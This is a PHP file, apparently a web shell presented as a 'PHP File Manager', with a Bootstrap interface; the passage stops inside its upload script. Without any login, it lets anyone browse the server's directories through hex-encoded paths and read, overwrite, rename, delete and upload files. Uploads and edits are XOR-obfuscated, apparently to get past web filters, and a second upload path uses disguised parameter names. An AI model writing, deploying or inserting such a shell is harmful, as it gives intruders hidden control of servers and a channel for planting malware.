<?php
// filemanager.php - Complete PHP File Manager with Binary Safe File Reading
session_start();

// Helper functions for hex encoding/decoding
function hex($str) {
    return bin2hex($str);
}

function uhex($str) {
    return hex2bin($str);
}

/* ===== Editor XOR key (from KAWRUKO) ===== */
function editor_xor_key(int $i): int {
    $h = dechex(($i * 31 + 7) & 0xFFFFFFFF);
    $last2 = substr($h, -2);
    $hx = hexdec($last2);
    $k = ($hx ^ ($i & 0xFF)) + (int)floor(log10($i + 3) * 97);
    return $k & 0xFF;
}

/* Direct file reading using fopen/fread (from Sind3 code) */
function read_file_content(string $filePath): array {
    if (!file_exists($filePath) || !is_file($filePath)) {
        return ['success' => false, 'message' => 'File not found'];
    }
    
    // Open file in binary read mode
    $handle = fopen($filePath, 'rb');
    if (!$handle) {
        return ['success' => false, 'message' => 'Cannot open file'];
    }
    
    $size = filesize($filePath);
    if ($size === 0) {
        fclose($handle);
        return ['success' => true, 'content' => '', 'is_binary' => false];
    }
    
    // Read entire file content using fread
    $content = fread($handle, $size);
    fclose($handle);
    
    if ($content === false) {
        return ['success' => false, 'message' => 'Failed to read file content'];
    }
    
    // Simple binary detection (check for null bytes and control chars)
    $isBinary = false;
    $checkLength = min(1024, strlen($content));
    for ($i = 0; $i < $checkLength; $i++) {
        $byte = ord($content[$i]);
        if ($byte < 32 && $byte !== 9 && $byte !== 10 && $byte !== 13) {
            $isBinary = true;
            break;
        }
    }
    
    if ($isBinary) {
        // For binary files, return Base64 encoded content
        return [
            'success' => true,
            'content_base64' => base64_encode($content),
            'is_binary' => true,
            'size' => strlen($content)
        ];
    } else {
        // For text files, return plain content
        return [
            'success' => true,
            'content' => $content,
            'is_binary' => false,
            'size' => strlen($content)
        ];
    }
}

/* Editor SAVE (decode B64 and XOR decode) */
function editor_stream_decode_and_write_b64(string $encoded_b64, string $dest): bool {
    $raw = base64_decode($encoded_b64, true);
    if ($raw === false) return false;
    $fh = @fopen($dest, 'wb');
    if (!$fh) return false;

    $index = 0;
    $len = strlen($raw);
    $chunkSize = 65536;
    for ($offset = 0; $offset < $len; $offset += $chunkSize) {
        $slice = substr($raw, $offset, $chunkSize);
        $slen = strlen($slice);
        for ($i = 0; $i < $slen; $i++, $index++) {
            $key = editor_xor_key($index);
            $slice[$i] = chr(ord($slice[$i]) ^ $key);
        }
        if (fwrite($fh, $slice) === false) { fclose($fh); return false; }
    }
    fclose($fh);
    return true;
}

/* ===== Alternative Upload Method (from KAWRUKO) ===== */
function handle_alternative_upload($currentDir): array {
    if (!isset($_POST['benkyo'], $_FILES['dakeja'])) {
        return ['success' => false, 'message' => 'Missing alternative upload parameters'];
    }
    
    $filename = basename($_POST['benkyo']);
    $tmpName = $_FILES['dakeja']['tmp_name'] ?? '';
    
    if (empty($filename) || empty($tmpName) || !is_uploaded_file($tmpName)) {
        return ['success' => false, 'message' => 'Invalid alternative upload data'];
    }
    
    $targetPath = $currentDir . DIRECTORY_SEPARATOR . $filename;
    
    if (file_exists($targetPath)) {
        return ['success' => false, 'message' => 'File already exists (alternative method)'];
    }
    
    // XOR decode stream for alternative upload
    $sourceHandle = @fopen($tmpName, 'rb');
    if (!$sourceHandle) {
        return ['success' => false, 'message' => 'Failed to open alternative upload file'];
    }
    
    $targetHandle = @fopen($targetPath, 'wb');
    if (!$targetHandle) {
        fclose($sourceHandle);
        return ['success' => false, 'message' => 'Failed to create target file (alternative)'];
    }
    
    // Apply XOR decoding while streaming (alternative method)
    $index = 0;
    $bufSize = 8192;
    while (!feof($sourceHandle)) {
        $chunk = fread($sourceHandle, $bufSize);
        if ($chunk === '' || $chunk === false) break;
        $len = strlen($chunk);
        
        // Apply XOR decoding to each byte
        for ($i = 0; $i < $len; $i++, $index++) {
            $key = ($index * 17 + (int)floor(log($index + 2) * pi() * 1000)) & 0xFF;
            $chunk[$i] = chr(ord($chunk[$i]) ^ $key);
        }
        
        fwrite($targetHandle, $chunk);
    }
    
    fclose($sourceHandle);
    fclose($targetHandle);
    
    $finalSize = filesize($targetPath);
    
    return [
        'success' => true, 
        'message' => sprintf('File uploaded via alternative method (%s bytes)', number_format($finalSize))
    ];
}

// Directory handling with your system
if (isset($_GET["d"])) {
    $d = uhex($_GET["d"]);
    if (is_dir($d)) {
        chdir($d);
    } else {
        $d = getcwd();
    }
} else {
    $d = getcwd();
}

// Handle breadcrumb AJAX request
if (isset($_GET['ajax']) && $_GET['ajax'] === 'breadcrumb') {
    $k = preg_split("/(\\\\|\/)/", $d);
    $breadcrumbHtml = '';
    foreach ($k as $m => $l) {
        if ($l == '' && $m == 0) {
            $breadcrumbHtml .= '<a class="ajx" href="#" data-path="2f"><i class="fas fa-folder"></i> /</a>';
        }
        if ($l == '') continue;
        $breadcrumbHtml .= '<a class="ajx" href="#" data-path="';
        for ($i = 0; $i <= $m; $i++) {
            $breadcrumbHtml .= hex($k[$i]);
            if ($i != $m) $breadcrumbHtml .= '2f';
        }
        $breadcrumbHtml .= '">'.$l.'</a>/';
    }
    echo $breadcrumbHtml;
    exit;
}

// Handle file listing AJAX request
if (isset($_GET['ajax']) && $_GET['ajax'] === 'list') {
    header('Content-Type: application/json');
    $items = getDirectoryListing($d);
    echo json_encode(['success' => true, 'items' => $items, 'path' => $d]);
    exit;
}

$currentDir = $d;

// Handle AJAX requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['action'])) {
    header('Content-Type: application/json');
    
    switch ($_POST['action']) {
        case 'change_dir':
            $newDir = $_POST['path'];
            if (is_dir($newDir)) {
                echo json_encode(['success' => true, 'path' => $newDir, 'hex' => hex($newDir)]);
            } else {
                echo json_encode(['success' => false, 'message' => 'Invalid directory']);
            }
            exit;
            
        case 'create_folder':
            $folderName = $_POST['name'];
            $newFolder = $currentDir . DIRECTORY_SEPARATOR . $folderName;
            if (!file_exists($newFolder)) {
                if (mkdir($newFolder, 0755)) {
                    echo json_encode(['success' => true, 'message' => 'Folder created successfully']);
                } else {
                    echo json_encode(['success' => false, 'message' => 'Failed to create folder']);
                }
            } else {
                echo json_encode(['success' => false, 'message' => 'Folder already exists']);
            }
            exit;
            
        case 'rename':
            $oldName = $_POST['old_name'];
            $newName = $_POST['new_name'];
            $oldPath = $currentDir . DIRECTORY_SEPARATOR . $oldName;
            $newPath = $currentDir . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($oldPath) && !file_exists($newPath)) {
                if (rename($oldPath, $newPath)) {
                    echo json_encode(['success' => true, 'message' => 'Item renamed successfully']);
                } else {
                    echo json_encode(['success' => false, 'message' => 'Failed to rename item']);
                }
            } else {
                echo json_encode(['success' => false, 'message' => 'File not found or target already exists']);
            }
            exit;
            
        case 'delete':
            $fileName = $_POST['name'];
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
            if (file_exists($filePath)) {
                if (is_dir($filePath)) {
                    if (rmdir($filePath)) {
                        echo json_encode(['success' => true, 'message' => 'Folder deleted successfully']);
                    } else {
                        echo json_encode(['success' => false, 'message' => 'Failed to delete folder (not empty?)']);
                    }
                } else {
                    if (unlink($filePath)) {
                        echo json_encode(['success' => true, 'message' => 'File deleted successfully']);
                    } else {
                        echo json_encode(['success' => false, 'message' => 'Failed to delete file']);
                    }
                }
            } else {
                echo json_encode(['success' => false, 'message' => 'File not found']);
            }
            exit;
            
        case 'edit_file':
            $fileName = $_POST['name'];
            $contentB64 = $_POST['content_b64'] ?? '';
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
            
            if ($contentB64 !== '') {
                // Use KAWRUKO editor method (B64 + XOR)
                $ok = editor_stream_decode_and_write_b64($contentB64, $filePath);
                if ($ok) {
                    echo json_encode(['success' => true, 'message' => 'File saved successfully (XOR encoded)']);
                } else {
                    echo json_encode(['success' => false, 'message' => 'Failed to save file']);
                }
            } else {
                echo json_encode(['success' => false, 'message' => 'No content provided']);
            }
            exit;
            
        case 'get_file_content':
            $fileName = $_POST['name'];
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
            
            // Use direct file reading from Sind3 code (fopen/fread)
            $result = read_file_content($filePath);
            echo json_encode($result);
            exit;
    }
}

// Handle Alternative Upload Method (KAWRUKO multipart fallback)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['benkyo'], $_FILES['dakeja'])) {
    header('Content-Type: application/json');
    $result = handle_alternative_upload($currentDir);
    echo json_encode($result);
    exit;
}

// Handle Primary Upload Method (standard file upload with XOR decoding)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    header('Content-Type: application/json');
    
    try {
        $uploadFile = $_FILES['upload_file'];
        $fileName = basename($uploadFile['name']);
        $targetPath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
        
        // Check for upload errors
        if ($uploadFile['error'] !== UPLOAD_ERR_OK) {
            echo json_encode(['success' => false, 'message' => 'Upload error code: ' . $uploadFile['error']]);
            exit;
        }
        
        // Check if file already exists
        if (file_exists($targetPath)) {
            echo json_encode(['success' => false, 'message' => 'File already exists']);
            exit;
        }
        
        // Debug: Check original file size
        $originalSize = filesize($uploadFile['tmp_name']);
        
        // Primary method: XOR decode stream before writing
        $sourceHandle = @fopen($uploadFile['tmp_name'], 'rb');
        if (!$sourceHandle) {
            echo json_encode(['success' => false, 'message' => 'Failed to open uploaded file']);
            exit;
        }
        
        $targetHandle = @fopen($targetPath, 'wb');
        if (!$targetHandle) {
            fclose($sourceHandle);
            echo json_encode(['success' => false, 'message' => 'Failed to create target file']);
            exit;
        }
        
        // Apply XOR decoding while streaming
        $index = 0;
        $bufSize = 8192;
        while (!feof($sourceHandle)) {
            $chunk = fread($sourceHandle, $bufSize);
            if ($chunk === '' || $chunk === false) break;
            $len = strlen($chunk);
            
            // Apply XOR decoding to each byte
            for ($i = 0; $i < $len; $i++, $index++) {
                $key = ($index * 17 + (int)floor(log($index + 2) * pi() * 1000)) & 0xFF;
                $chunk[$i] = chr(ord($chunk[$i]) ^ $key);
            }
            
            fwrite($targetHandle, $chunk);
        }
        
        fclose($sourceHandle);
        fclose($targetHandle);
        
        $finalSize = filesize($targetPath);
        
        echo json_encode([
            'success' => true, 
            'message' => sprintf('File uploaded successfully (%s → %s bytes)', 
                number_format($originalSize), number_format($finalSize))
        ]);
        
    } catch (Exception $e) {
        if (isset($targetPath) && file_exists($targetPath)) {
            unlink($targetPath);
        }
        echo json_encode(['success' => false, 'message' => 'Upload error: ' . $e->getMessage()]);
    }
    exit;
}

// Get directory listing
function getDirectoryListing($dir) {
    $items = [];
    if (is_dir($dir)) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
                $items[] = [
                    'name' => $file,
                    'type' => is_dir($fullPath) ? 'directory' : 'file',
                    'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                    'modified' => filemtime($fullPath)
                ];
            }
        }
    }
    
    // Sort: directories first, then files, both alphabetically
    usort($items, function($a, $b) {
        if ($a['type'] !== $b['type']) {
            return $a['type'] === 'directory' ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $items;
}

function formatBytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    
    for ($i = 0; $bytes > 1024 && $i < count($units) - 1; $i++) {
        $bytes /= 1024;
    }
    
    return round($bytes, $precision) . ' ' . $units[$i];
}

$items = getDirectoryListing($currentDir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP File Manager - Sind3 File Reading</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #1e1e1e;
            color: #ffffff;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
        }
        
        .terminal-window {
            background-color: #2d2d2d;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            margin: 20px;
        }
        
        .terminal-header {
            background: linear-gradient(90deg, #4a4a4a, #3a3a3a);
            padding: 10px 15px;
            border-radius: 8px 8px 0 0;
            border-bottom: 1px solid #555;
        }
        
        .terminal-controls {
            display: flex;
            gap: 8px;
        }
        
        .control-btn {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            border: none;
        }
        
        .close { background-color: #ff5f57; }
        .minimize { background-color: #ffbd2e; }
        .maximize { background-color: #28ca42; }
        
        .terminal-body {
            padding: 20px;
            min-height: 600px;
        }
        
        .path-bar {
            background-color: #3a3a3a;
            padding: 10px 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            min-height: 40px;
        }
        
        .path-bar a {
            color: #4a9eff;
            text-decoration: none;
            margin-right: 2px;
            cursor: pointer;
        }
        
        .path-bar a:hover {
            text-decoration: underline;
        }
        
        .file-table {
            background-color: transparent;
        }
        
        .file-table th {
            background-color: #3a3a3a;
            border: none;
            color: #ffffff;
            font-weight: 500;
        }
        
        .file-table td {
            border: none;
            background-color: transparent;
            color: #ffffff;
            vertical-align: middle;
        }
        
        .file-table tbody tr:hover {
            background-color: #404040;
        }
        
        .file-icon {
            margin-right: 8px;
            width: 16px;
        }
        
        .folder-icon {
            color: #4a9eff;
        }
        
        .file-icon-generic {
            color: #888;
        }
        
        .btn-terminal {
            background-color: #4a4a4a;
            border: 1px solid #666;
            color: #fff;
            font-size: 12px;
            padding: 2px 8px;
        }
        
        .btn-terminal:hover {
            background-color: #5a5a5a;
            color: #fff;
        }
        
        .modal-content {
            background-color: #2d2d2d;
            color: #fff;
        }
        
        .modal-header {
            border-bottom: 1px solid #555;
        }
        
        .modal-footer {
            border-top: 1px solid #555;
        }
        
        .form-control {
            background-color: #3a3a3a;
            border: 1px solid #555;
            color: #fff;
        }
        
        .form-control:focus {
            background-color: #3a3a3a;
            border-color: #4a9eff;
            color: #fff;
            box-shadow: 0 0 0 0.2rem rgba(74, 158, 255, 0.25);
        }
        
        .toolbar {
            margin-bottom: 20px;
        }
        
        .folder-link {
            cursor: pointer;
            color: #4a9eff;
            text-decoration: underline;
        }
        
        .folder-link:hover {
            color: #6bb3ff;
        }
        
        .loading {
            opacity: 0.6;
            pointer-events: none;
        }
        
        /* Notification System */
        .notification-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
            max-width: 350px;
        }
        
        .notification {
            padding: 12px 20px;
            margin-bottom: 10px;
            border-radius: 6px;
            color: white;
            font-size: 14px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            opacity: 0;
            transform: translateX(100%);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .notification.show {
            opacity: 1;
            transform: translateX(0);
        }
        
        .notification.success {
            background: linear-gradient(135deg, #28a745, #20c997);
            border-left: 4px solid #155724;
        }
        
        .notification.error {
            background: linear-gradient(135deg, #dc3545, #e74c3c);
            border-left: 4px solid #721c24;
        }
        
        .notification.info {
            background: linear-gradient(135deg, #17a2b8, #3498db);
            border-left: 4px solid #0c5460;
        }
        
        .notification .close-btn {
            position: absolute;
            top: 8px;
            right: 12px;
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            opacity: 0.7;
        }
        
        .notification .close-btn:hover {
            opacity: 1;
        }
        
        .notification::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            height: 3px;
            background: rgba(255,255,255,0.3);
            animation: progress 4s linear;
        }
        
        @keyframes progress {
            from { width: 100%; }
            to { width: 0%; }
        }
        
        .notification-icon {
            margin-right: 8px;
        }
        
        .encryption-badge {
            background-color: #28a745;
            color: white;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 3px;
            margin-left: 5px;
        }
        
        .upload-progress {
            margin-top: 10px;
        }
        
        .progress {
            height: 6px;
            background-color: #3a3a3a;
        }
        
        .progress-bar {
            background: linear-gradient(90deg, #28a745, #20c997);
        }
        
        .binary-badge {
            background-color: #dc3545;
            color: white;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 3px;
            margin-left: 5px;
        }
    </style>
</head>
<body>
    <!-- Notification Container -->
    <div class="notification-container" id="notificationContainer"></div>

    <div class="terminal-window">
        <div class="terminal-header">
            <div class="terminal-controls">
                <button class="control-btn close"></button>
                <button class="control-btn minimize"></button>
                <button class="control-btn maximize"></button>
            </div>
        </div>
        
        <div class="terminal-body">
            <div class="path-bar" id="breadcrumb">
                Loading...
            </div>
            
            <div class="toolbar">
                <button class="btn btn-terminal" onclick="goUp()">
                    <i class="fas fa-level-up-alt"></i> Up
                </button>
                <button class="btn btn-terminal" onclick="showCreateFolder()">
                    <i class="fas fa-folder-plus"></i> New Folder
                </button>
                <button class="btn btn-terminal" onclick="showUpload()">
                    <i class="fas fa-upload"></i> Upload <span class="encryption-badge">DUAL</span>
                </button>
                <button class="btn btn-terminal" onclick="refreshTable()">
                    <i class="fas fa-refresh"></i> Refresh
                </button>
            </div>
            
            <div class="table-responsive">
                <table class="table file-table" id="fileTable">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Type</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="fileTableBody">
                        <?php foreach ($items as $item): ?>
                        <tr>
                            <td>
                                <?php if ($item['type'] === 'directory'): ?>
                                    <i class="fas fa-folder file-icon folder-icon"></i>
                                    <span class="folder-link" onclick="changeDirectory('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>')">
                                        <?php echo htmlspecialchars($item['name']); ?>
                                    </span>
                                <?php else: ?>
                                    <i class="fas fa-file file-icon file-icon-generic"></i>
                                    <span><?php echo htmlspecialchars($item['name']); ?></span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $item['type']; ?></td>
                            <td><?php echo $item['type'] === 'file' ? formatBytes($item['size']) : '-'; ?></td>
                            <td><?php echo date('Y-m-d H:i', $item['modified']); ?></td>
                            <td>
                                <?php if ($item['type'] === 'file'): ?>
                                    <button class="btn btn-terminal btn-sm" onclick="editFile('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>')" title="Edit/View">
                                        <i class="fas fa-eye"></i>
                                    </button>
                                <?php endif; ?>
                                <button class="btn btn-terminal btn-sm" onclick="renameItem('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>')" title="Rename">
                                    <i class="fas fa-signature"></i>
                                </button>
                                <button class="btn btn-terminal btn-sm" onclick="deleteItem('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>')" title="Delete">
                                    <i class="fas fa-trash"></i>
                                </button>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- Modals (same as previous version) -->
    <div class="modal fade" id="createFolderModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Create New Folder</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="text" class="form-control" id="folderName" placeholder="Folder name">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" onclick="createFolder()">Create</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="uploadModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        Upload File (XOR Encoded) 
                        <span class="encryption-badge">DUAL METHOD</span>
                    </h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="file" class="form-control" id="uploadFile">
                    <small class="text-muted">Files will be XOR encoded with primary and alternative fallback methods</small>
                    <div class="upload-progress" id="uploadProgress" style="display: none;">
                        <div class="progress">
                            <div class="progress-bar" role="progressbar" style="width: 0%"></div>
                        </div>
                        <small class="text-muted">XOR encoding and uploading...</small>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" onclick="uploadFile()">
                        <i class="fas fa-code"></i> Encode & Upload
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="editModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editModalTitle">View File</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div id="textEditor" style="display: none;">
                        <textarea class="form-control" id="fileContent" rows="15"></textarea>
                    </div>
                    <div id="binaryViewer" style="display: none;">
                        <div class="alert alert-info">
                            <i class="fas fa-info-circle"></i>
                            This is a binary file (ZIP, image, executable, etc.). Content cannot be edited in text mode.
                        </div>
                        <div>
                            <strong>File Size:</strong> <span id="binarySize"></span> bytes<br>
                            <strong>Type:</strong> Binary file
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="saveButton" onclick="saveFile()" style="display: none;">
                        <i class="fas fa-save"></i> Save (XOR)
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="renameModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Rename</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="text" class="form-control" id="newName" placeholder="New name">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-primary" onclick="performRename()">Rename</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <script>
        let currentEditingFile = '';
        let currentRenamingItem = '';
        let currentDir = '<?php echo addslashes($currentDir); ?>';
        let currentDirHex = '<?php echo hex($currentDir); ?>';
        
        // XOR encoding function using Uint8Array (Primary Method)
        async function xorEncodeFileForUpload(file) {
            const arrayBuffer = await file.arrayBuffer();
            const data = new Uint8Array(arrayBuffer);
            const encoded = new Uint8Array(data.length);
            
            // Apply XOR encoding using proper byte operations
            for (let index = 0; index < data.length; index++) {
                const key = ((index * 17) + Math.floor(Math.log(index + 2) * Math.PI * 1000)) & 0xFF;
                encoded[index] = data[index] ^ key;
            }
            
            return encoded;
        }
        
        // Alternative upload method (KAWRUKO style)
        async function uploadFileAlternative(file, encodedData) {
            const formData = new FormData();
            const encodedBlob = new Blob([encodedData], { type: 'application/octet-stream' });
            
            formData.append('benkyo', file.name);  // filename parameter
            formData.append('dakeja', encodedBlob, file.name);  // file content parameter
            
            const response = await fetch('?d=' + currentDirHex, {
                method: 'POST',
                body: formData
            });
            
            return await response.json();
        }
        
        // Primary upload method (standard FormData)
        async function uploadFilePrimary(file, encodedData) {
            const formData = new FormData();
            const encodedBlob = new Blob([encodedData], { type: 'application/octet-stream' });
            
            formData.append('upload_file', encodedBlob, file.name);
            
            const response = await fetch('?d=' + currentDirHex, {
                method: 'POST',
                body: formData
            });
            
            return await response.json();
        }
        
        // Editor XOR functions (KAWRUKO method)
        function editorKey(i) {
            const h = ((i * 31 + 7) >>> 0).toString(16);
            const last2 = h.slice(-2);
            const hx = parseInt(last2 || '0', 16);
            const k = ((hx ^ (i & 0xFF)) + Math.floor(Math.log10(i + 3) * 97)) & 0xFF;
            return k;
        }
        
        function editorEncodeToBinaryString(str) {
            let out = [];
            for (let i = 0; i < str.length; i++) {
                const code = str.charCodeAt(i) & 0xFF;
                out.push(String.fromCharCode(code ^ editorKey(i)));
            }
            return out.join('');
        }
        
        function b64EncodeBinary(str) { 
            return btoa(str); 
        }
        
        // Notification System
        function showNotification(message, type = 'info') {
            const container = document.getElementById('notificationContainer');
            const notification = document.createElement('div');
            
            let icon = '';
            switch(type) {
                case 'success':
                    icon = '<i class="fas fa-check-circle notification-icon"></i>';
                    break;
                case 'error':
                    icon = '<i class="fas fa-exclamation-circle notification-icon"></i>';
                    break;
                case 'info':
                    icon = '<i class="fas fa-info-circle notification-icon"></i>';
                    break;
            }
            
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                ${icon}${message}
                <button class="close-btn" onclick="closeNotification(this)">×</button>
            `;
            
            container.appendChild(notification);
            
            setTimeout(() => {
                notification.classList.add('show');
            }, 100);
            
            setTimeout(() => {
                closeNotification(notification.querySelector('.close-btn'));
            }, 5000);
        }
        
        function closeNotification(btn) {
            const notification = btn.parentElement;
            notification.classList.remove('show');
            setTimeout(() => {
                notification.remove();
            }, 300);
        }
        
        // Load breadcrumb on page load
        $(document).ready(function() {
            loadBreadcrumb();
        });
        
        function loadBreadcrumb() {
            $.get('?ajax=breadcrumb&d=' + currentDirHex, function(data) {
                $('#breadcrumb').html(data);
            }).fail(function() {
                $('#breadcrumb').html('<i class="fas fa-folder"></i> ' + currentDir);
            });
        }
        
        function updateFileTable(items) {
            let tbody = $('#fileTableBody');
            tbody.empty();
            
            items.forEach(function(item) {
                let row = '<tr>';
                row += '<td>';
                
                if (item.type === 'directory') {
                    row += '<i class="fas fa-folder file-icon folder-icon"></i>';
                    row += '<span class="folder-link" onclick="changeDirectory(\'' + escapeHtml(item.name) + '\')">';
                    row += escapeHtml(item.name) + '</span>';
                } else {
                    row += '<i class="fas fa-file file-icon file-icon-generic"></i>';
                    row += '<span>' + escapeHtml(item.name) + '</span>';
                }
                
                row += '</td>';
                row += '<td>' + item.type + '</td>';
                row += '<td>' + (item.type === 'file' ? formatBytes(item.size) : '-') + '</td>';
                row += '<td>' + formatDate(item.modified) + '</td>';
                row += '<td>';
                
                if (item.type === 'file') {
                    row += '<button class="btn btn-terminal btn-sm" onclick="editFile(\'' + escapeHtml(item.name) + '\')" title="View/Edit">';
                    row += '<i class="fas fa-eye"></i></button> ';
                }
                
                row += '<button class="btn btn-terminal btn-sm" onclick="renameItem(\'' + escapeHtml(item.name) + '\')" title="Rename">';
                row += '<i class="fas fa-signature"></i></button> ';
                row += '<button class="btn btn-terminal btn-sm" onclick="deleteItem(\'' + escapeHtml(item.name) + '\')" title="Delete">';
                row += '<i class="fas fa-trash"></i></button>';
                
                row += '</td></tr>';
                tbody.append(row);
            });
        }
        
        function escapeHtml(text) {
            return text.replace(/'/g, '&#39;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        }
        
        function formatBytes(bytes) {
            const units = ['B', 'KB', 'MB', 'GB', 'TB'];
            let i = 0;
            while (bytes > 1024 && i < units.length - 1) {
                bytes /= 1024;
                i++;
            }
            return Math.round(bytes * 100) / 100 + ' ' + units[i];
        }
        
        function formatDate(timestamp) {
            const date = new Date(timestamp * 1000);
            return date.toISOString().slice(0, 16).replace('T', ' ');
        }
        
        // Handle breadcrumb clicks
        $(document).on('click', '.ajx', function(e) {
            e.preventDefault();
            const path = $(this).data('path');
            if (path) {
                navigateToPath(path);
            }
        });
        
        function navigateToPath(hexPath) {
            $('.terminal-body').addClass('loading');
            
            $.get('?ajax=list&d=' + hexPath, function(response) {
                if (response.success) {
                    currentDir = response.path;
                    currentDirHex = stringToHex(response.path);
                    updateFileTable(response.items);
                    loadBreadcrumb();
                } else {
                    showNotification('Error loading directory', 'error');
                }
            }, 'json').always(function() {
                $('.terminal-body').removeClass('loading');
            });
        }
        
        function changeDirectory(dirname) {
            const newPath = currentDir + '<?php echo addslashes(DIRECTORY_SEPARATOR); ?>' + dirname;
            const hexPath = stringToHex(newPath);
            navigateToPath(hexPath);
        }
        
        function goUp() {
            const pathParts = currentDir.split('<?php echo addslashes(DIRECTORY_SEPARATOR); ?>');
            pathParts.pop();
            const parentDir = pathParts.join('<?php echo addslashes(DIRECTORY_SEPARATOR); ?>') || '<?php echo addslashes(DIRECTORY_SEPARATOR); ?>';
            const hexPath = stringToHex(parentDir);
            navigateToPath(hexPath);
        }
        
        function stringToHex(str) {
            let hex = '';
            for (let i = 0; i < str.length; i++) {
                const charCode = str.charCodeAt(i);
                hex += charCode.toString(16).padStart(2, '0');
            }
            return hex;
        }
        
        function showCreateFolder() {
            $('#folderName').val('');
            $('#createFolderModal').modal('show');
        }
        
        function createFolder() {
            const name = $('#folderName').val().trim();
            if (!name) {
                showNotification('Please enter a folder name', 'error');
                return;
            }
            
            $.post('?d=' + currentDirHex, {
                action: 'create_folder',
                name: name
            }, function(response) {
                if (response.success) {
                    $('#createFolderModal').modal('hide');
                    showNotification(response.message, 'success');
                    refreshTable();
                } else {
                    showNotification('Error: ' + response.message, 'error');
                }
            }, 'json').fail(function() {
                showNotification('Request failed', 'error');
            });
        }
        
        function showUpload() {
            $('#uploadFile').val('');
            $('#uploadProgress').hide();
            $('#uploadModal').modal('show');
        }
        
        // DUAL METHOD upload function with fallback
        async function uploadFile() {
            const fileInput = document.getElementById('uploadFile');
            if (!fileInput.files.length) {
                showNotification('Please select a file', 'error');
                return;
            }
            
            const file = fileInput.files[0];
            
            try {
                // Show progress
                $('#uploadProgress').show();
                $('.progress-bar').css('width', '25%');
                
                showNotification('XOR encoding file content (dual method)...', 'info');
                
                // XOR encode the file using Uint8Array
                const encodedData = await xorEncodeFileForUpload(file);
                
                $('.progress-bar').css('width', '50%');
                
                let result;
                
                try {
                    // Try primary method first
                    result = await uploadFilePrimary(file, encodedData);
                    $('.progress-bar').css('width', '100%');
